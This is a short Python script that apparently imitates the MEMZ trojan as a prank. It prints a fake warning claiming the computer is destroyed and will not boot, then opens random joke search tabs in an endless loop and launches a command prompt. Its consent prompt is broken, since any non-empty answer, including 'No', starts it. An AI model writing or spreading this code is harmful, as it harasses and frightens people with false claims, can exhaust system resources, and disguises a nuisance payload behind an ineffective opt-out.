import os
import time
import random
import webbrowser

sites = ["https://www.google.co.ck/search?q=how+2+remove+a+virus", "https://www.google.co.ck/search?q=how+to+get+money", "https://play.clubpenguin.com", "https://www.google.co.ck/search?q=batch+virus+download", "https://www.google.co.ck/search?q=what+happens+if+you+delete+system32", "https://www.google.co.ck/search?q=bonzi+buddy+download+free", "https://www.google.co.ck/search?q=how+2+buy+weed", "https://www.google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp", "https://www.pcoptimizerpro.com", "https://www.google.co.ck/search?q=mcafee+vs+norton", "https://www.google.co.ck/search?q=internet+explorer+is+the+best+browser"]


run = True
choice1 = input("The Software you just executed is considered malware. This malware will harm your computer and makes it unusable. If you are seeing this message without knowing what you just executed, simply press No and nothing will happen. If you know what this malware does and are using a safe enviroment to test, press Yes to start it. DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNSUABLE MACHINE.")
if choice1:
    print("YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN. Your computer won't boot up again, so use it as long as you can! :D Trying to kill MEMZ will cause your system to be destroyed instantly, so don't try it :D")
    time.sleep(5)
    webbrowser.open(random.choice(sites))
    time.sleep(5)
    webbrowser.open(random.choice(sites))
    time.sleep(5)
    webbrowser.open(random.choice(sites))
    time.sleep(5)
    webbrowser.open(random.choice(sites))
    time.sleep(5)
    webbrowser.open(random.choice(sites))
    time.sleep(1)
    os.system('cmd')
    time.sleep(3)
    while run == True:
        webbrowser.open(random.choice(sites))
        time.sleep(5)
